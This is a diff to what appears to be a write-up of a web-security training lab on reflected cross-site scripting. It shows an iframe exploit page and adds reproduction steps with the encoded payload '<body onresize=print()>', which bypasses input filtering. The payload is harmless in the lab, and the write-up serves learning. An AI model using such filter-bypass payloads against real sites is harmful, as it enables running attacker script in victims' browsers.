@@ -32,6 +32,13 @@ Exploit:
 <iframe src="https://0ab300e5033f9ca480f8031f001100da.web-security-academy.net/?search=%3Cbody%20onresize%3Dprint()%3E" onload="this.style.width='100px'; setTimeout(()=>this.style.width='200px',100);"></iframe>
 ```
 
+## Reproduction Steps
+1. Navigate to the vulnerable search endpoint
+2. Inject the payload:
+   %3Cbody%20onresize%3Dprint()%3E
+3. Load the exploit page containing an iframe that resizes
+4. Observe the print dialog triggered in the victim browser
+
 ## Impact
 
 An attacker can bypass input filtering mechanisms and execute arbitrary JavaScript in a victim’s browser. This could lead to:
